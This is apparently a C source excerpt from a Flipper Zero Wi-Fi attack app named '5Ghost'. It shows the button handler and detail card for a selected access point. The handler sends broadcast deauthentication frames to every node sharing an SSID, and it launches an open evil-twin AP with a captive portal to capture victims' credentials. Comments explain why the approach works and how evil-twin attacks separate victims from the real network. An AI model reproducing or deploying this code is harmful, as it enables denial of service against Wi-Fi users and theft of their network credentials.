void info_wifi_button_press(GuiButtonType result, InputType type, void* context) {
    FURI_LOG_D(TAG, __func__);
    FURI_LOG_D(TAG, "%d %d", type, result);
    Ghost5App* app = context;
    if(result == GuiButtonTypeCenter && type == 0) {
        // 5Ghost: Deauth/Stop ALL APs sharing this SSID. A Mesh network broadcasts the same
        // name on multiple BSSIDs (different nodes/bands); deauthing only the selected BSSID
        // misses the node the client roamed to, so it looks like the attack "does nothing".
        // Accumulate the whole same-SSID group into the firmware's DEAUTHADD target array, then
        // DEAUTHRUN once so the service loop round-robins every node (MULTI-AP Card C1).
        // (The old path sent one DEAUTH per node — each is a single-target reset that overwrites
        // the previous, so only the LAST BSSID was ever actually deauthed; the "deauth_wifis"
        // multi-target list it claimed to write never existed in the firmware.)
        const char* target_ssid = app->wifiList[app->selectedWifi].APssid;
        bool ssid_empty = (target_ssid == NULL || target_ssid[0] == '\0');
        bool starting = (app->wifiList[app->selectedWifi].deauth == false);
        if(starting) {
            if(!g5_tx_ch(app->wifiList[app->selectedWifi].channel)) {
                g5_show_rx_only(app);
                return;
            }
            // Clear any stale firmware target array first, then accumulate. Card A's STOP now
            // clears unconditionally (even when the radio is already IDLE), so this reliably
            // starts from an empty array rather than appending onto leftovers.
            uart_helper_send(app->uart_helper, "STOP\n", 5);
            // Accumulate protocol: DEAUTHADD <bssid12hex> <client12hex> <ch> per node; client =
            // broadcast FFFFFFFFFFFF deauths every station of that BSSID. The firmware caps the
            // array at G5_DEAUTH_MAX (8) and refuses extras (ERR:DEAUTHADD:full) without harm —
            // a mesh rarely broadcasts one name on more than 8 BSSIDs.
            for(int i = 0; i < app->wifiCount; i++) {
                bool same = ssid_empty ? (i == app->selectedWifi) :
                                         (strcmp(app->wifiList[i].APssid, target_ssid) == 0);
                if(!same) continue;
                if(!g5_tx_ch(app->wifiList[i].channel)) continue; // DFS sibling: RX only
                app->wifiList[i].deauth = true;
                char bssid12[13]; // strip colons from "AA:BB:CC:DD:EE:FF" -> 12 hex
                int n = 0;
                for(const char* p = app->wifiList[i].APbssid; *p && n < 12; p++)
                    if(*p != ':') bssid12[n++] = *p;
                bssid12[n] = '\0';
                char cmd[44]; // "DEAUTHADD " + 12 + ' ' + 12 + ' ' + up-to-3-digit ch + "\n" + NUL = 41
                snprintf(cmd, sizeof(cmd), "DEAUTHADD %s FFFFFFFFFFFF %d\n", bssid12,
                         app->wifiList[i].channel);
                uart_helper_send(app->uart_helper, cmd, strlen(cmd));
            }
            uart_helper_send(app->uart_helper, "DEAUTHRUN\n", 10); // arm the accumulated round-robin
        } else {
            // Firmware STOP is global (back to IDLE, stops all attack); selective
            // per-AP stop is deferred to P5. Clear every deauth flag so the UI matches.
            uart_helper_send(app->uart_helper, "STOP\n", 5);
            for(int i = 0; i < app->wifiCount; i++) app->wifiList[i].deauth = false;
        }
        // redraw the detail card in place (the deauth flag flipped); don't re-run on_enter,
        // which would needlessly re-send APMAC/REASON/PORTAL to the module.
        with_view_model(app->info_view, InfoModel * m, { UNUSED(m); }, true);
    } else if(result == GuiButtonTypeLeft && type == 0) {
        scene_manager_next_scene(app->scene_manager, configAttackScene);
    } else if(result == GuiButtonTypeRight && type == 0) {
        if(!fw_has_cap(app, 'E')) return; // P4 BP-7: evil portal needs E cap (P3); DSB fw -> no-op

        // 5Ghost evil-twin clone (bugfix): this path used to send the legacy "EVIL <idx>" verb,
        // but the clean-room firmware never implemented it — it only knows the APSTART setter
        // chain. The module replied ERR:UNKNOWN (silently swallowed by the ERR: handler) so no AP
        // ever came up, while this scene optimistically showed "Fake AP is up" — precisely the
        // "Evil AP starts but broadcasts no SSID and no error" field report. We now drive the same
        // firmware-supported chain that manual Create AP uses, cloning the selected AP's
        // SSID / BSSID / channel into an OPEN evil twin.
        APDetails* tgt = &app->wifiList[app->selectedWifi];

        // A hidden / empty SSID can't be cloned: APSTART "" would raise a no-name AP (the exact
        // old symptom). Bail without switching scenes so the user isn't shown a fake "AP is up".
        if(tgt->APssid == NULL || tgt->APssid[0] == '\0' ||
           strcmp(tgt->APssid, "<empty>") == 0) {
            return;
        }

        // Evil portal is 2.4 GHz only (firmware g5_evil_set_channel rejects ch > 13); a 5 GHz
        // target degrades to ch 6 so the twin still comes up rather than silently failing.
        int clone_ch = tgt->channel;
        if(clone_ch < 1 || clone_ch > 13) clone_ch = 6;

        credentials[0] = '\0';
        app->creds_path[0] = '\0'; // start a new creds file for this capture session

        // Firmware setter chain, same cadence as Create AP (one line per tick, 200 ms apart so
        // the module's slow line reader drains each command before the next). We deliberately do
        // NOT re-run info_wifi_scene_on_enter() — it would widget_reset() the very button element
        // whose callback we're inside; we switch straight to the TextBox-backed evilCredsScene.
        char apcmd[48];
        // Force an OPEN AP: clear any password left in the module's staging config by a prior
        // Create-AP run, otherwise the twin comes up WPA2 and victims can't associate.
        uart_helper_send(app->uart_helper, "PASSWORD \n", 10);
        furi_delay_ms(200);
        // Deliberately do NOT clone the target's BSSID. A rogue AP sharing both the SSID *and*
        // BSSID of a live AP collides with it at the 802.11 layer: clients then fail to auth
        // against either and "connect, then immediately drop" — a DoS, not a usable twin
        // (evil-twin literature + reproduced on-device, 2026-07). Mainstream Flipper evil-portal
        // apps likewise keep the module's own MAC; real evil-twin practice separates the victim
        // from the real AP with deauth, not a MAC collision. So: same SSID, module's own MAC,
        // open auth. (We do not send APMAC at all — the module keeps its default AP MAC.)
        snprintf(apcmd, sizeof(apcmd), "CHANNEL %d\n", clone_ch);
        uart_helper_send(app->uart_helper, apcmd, strlen(apcmd));
        furi_delay_ms(200);
        snprintf(apcmd, sizeof(apcmd), "PORTAL %d\n", app->captivePortal);
        uart_helper_send(app->uart_helper, apcmd, strlen(apcmd));
        furi_delay_ms(200);
        snprintf(apcmd, sizeof(apcmd), "APSTART %s\n", tgt->APssid);
        FURI_LOG_D(TAG, "clone evil twin: %s ch=%d (own MAC, open)", tgt->APssid, clone_ch);
        uart_helper_send(app->uart_helper, apcmd, strlen(apcmd));
        scene_manager_next_scene(app->scene_manager, evilCredsScene);
    }
}
// 5Ghost P8 UI redesign: AP detail card. Big SSID + band chip, lock + full security
// + inverted PMF! chip (deauth-immune warning), channel + signal bars + RSSI, MAC, and
// an Edit / Deauth / Evil button row. Own Canvas View (no longer shares app->widget).
// FUNC-D: defined later alongside ble_vendor_name (with the OUI table); forward-
// declared here because this AP detail card draws the vendor before that point.
static const char* wifi_oui_vendor(const char* bssid);

static void ghost_info_draw_callback(Canvas* canvas, void* model) {
    InfoModel* m = model;
    Ghost5App* app = m->app;
    canvas_clear(canvas);
    canvas_set_color(canvas, ColorBlack);
    if(!app || app->selectedWifi < 0 || app->selectedWifi >= app->wifiCount) {
        ghost_ui_header(canvas, "AP INFO", NULL);
        canvas_set_font(canvas, FontSecondary);
        canvas_draw_str_aligned(canvas, 64, 38, AlignCenter, AlignCenter, "No AP selected");
        return;
    }
    APDetails* ap = &app->wifiList[app->selectedWifi];

    // header: SSID (title) + a one-word threat verdict (right-aligned stat) that
    // teaches the PMF->attack relationship (ghost_ui_threat_hint). Reserve the
    // stat's width so a long SSID truncates instead of overlapping it.
    char ssid[34];
    ghost_ui_ssid(ap->APssid, ssid, sizeof(ssid));
    if(!ssid[0]) strcpy(ssid, "<hidden>");
    const char* threat = ghost_ui_threat_hint(ap->security, ap->pmf);
    int stat_w = 0;
    if(threat[0]) {
        canvas_set_font(canvas, FontSecondary);
        stat_w = canvas_string_width(canvas, threat) + 6; // gap before the title
    }
    canvas_set_font(canvas, FontPrimary);
    while(ssid[0] && canvas_string_width(canvas, ssid) > 122 - stat_w)
        ssid[strlen(ssid) - 1] = '\0';
    ghost_ui_header(canvas, ssid, threat[0] ? threat : NULL);

    canvas_set_font(canvas, FontSecondary);
    // line 1: lock + full security; a small PMF! flag on the right (deauth-immune warning —
    // a functional flag, the one bit of emphasis worth a pixel)
    const char* pmf = ghost_ui_pmf_tag(ap->security, ap->pmf);
    int sec_maxw = 110;
    if(pmf[0]) {
        int w = canvas_string_width(canvas, pmf);
        canvas_draw_box(canvas, 126 - w - 2, 16, w + 3, 10);
        canvas_set_color(canvas, ColorWhite);
        canvas_draw_str(canvas, 126 - w, 24, pmf);
        canvas_set_color(canvas, ColorBlack);
        sec_maxw = 126 - w - 2 - 16;
    }
    ghost_ui_lock(canvas, 4, 17, ap->security);
    char sec[28];
    strncpy(sec, ghost_ui_sec_full(ap->security), sizeof(sec) - 1);
    sec[sizeof(sec) - 1] = '\0';
    while(sec[0] && canvas_string_width(canvas, sec) > sec_maxw)
        sec[strlen(sec) - 1] = '\0';
    canvas_draw_str(canvas, 14, 24, sec);

    // line 2: channel + band (spelled out) on the left, RSSI right-aligned
    char cb[28]; // "Ch %d   %s" — headroom for an 11-char int + " 2.4 GHz"
    snprintf(cb, sizeof(cb), "Ch %d   %s", ap->channel, ghost_ui_band(ap->channel));
    canvas_draw_str(canvas, 4, 37, cb);
    char rs[20]; // headroom for "%d dBm"
    snprintf(rs, sizeof(rs), "%d dBm", ap->rssi);
    int rw = canvas_string_width(canvas, rs);
    canvas_draw_str(canvas, 126 - rw, 37, rs);

    // line 3: MAC (left) + router vendor from the OUI (right-aligned, only when the
    // BSSID's first 3 bytes match a known maker — FUNC-D). Unknown OUIs show nothing:
    // the full MAC above already carries the OUI. Same left/right split as line 2.
    canvas_draw_str(canvas, 4, 49, ap->APbssid);
    const char* oui_vend = wifi_oui_vendor(ap->APbssid);
    if(oui_vend) {
        // right-align the vendor, but only if it clears the fixed-width MAC on the
        // left with a small gap — otherwise skip it rather than overprint. The MAC
        // is 17 chars; this guard only bites for the widest names (Ubiquiti/MikroTik).
        int mac_w = canvas_string_width(canvas, ap->APbssid);
        int vw = canvas_string_width(canvas, oui_vend);
        if(126 - vw > 4 + mac_w + 4) canvas_draw_str(canvas, 126 - vw, 49, oui_vend);
    }

    // action row: a thin rule + three plain labels (Edit | Deauth | Evil), mapped to
    // Left / OK / Right. Flat and light — no stock button pills, no inverted block.
    if(ap->APssid && strcmp(ap->APssid, "<empty>") != 0) {
        // standard Flipper button affordance — proper left/OK/right key glyphs
        elements_button_left(canvas, "Edit");
        if(!g5_tx_ch(ap->channel))
            elements_button_center(canvas, "RX only");
        else
            elements_button_center(canvas, ap->deauth ? "Stop" : "Deauth");
        elements_button_right(canvas, "Evil");
    }
}

static bool ghost_info_input_callback(InputEvent* event, void* context) {
    Ghost5App* app = context;
    if(event->type != InputTypeShort) return false;
    if(app->selectedWifi < 0 || app->selectedWifi >= app->wifiCount) return false;
    const char* ssid = app->wifiList[app->selectedWifi].APssid;
    if(!(ssid && strcmp(ssid, "<empty>") != 0)) return false; // no actions for hidden APs
    switch(event->key) {
    case InputKeyLeft:
        info_wifi_button_press(GuiButtonTypeLeft, InputTypePress, app);
        return true;
    case InputKeyOk:
        info_wifi_button_press(GuiButtonTypeCenter, InputTypePress, app);
        return true;
    case InputKeyRight:
        info_wifi_button_press(GuiButtonTypeRight, InputTypePress, app);
        return true;
    case InputKeyDown:
        // 5Ghost FUNC-A: open the station (client) list for this AP (sends STASCAN).
        scene_manager_next_scene(app->scene_manager, staListScene);
        return true;
    default:
        return false; // Back/Up -> dispatcher (Back = previous scene)
    }
}

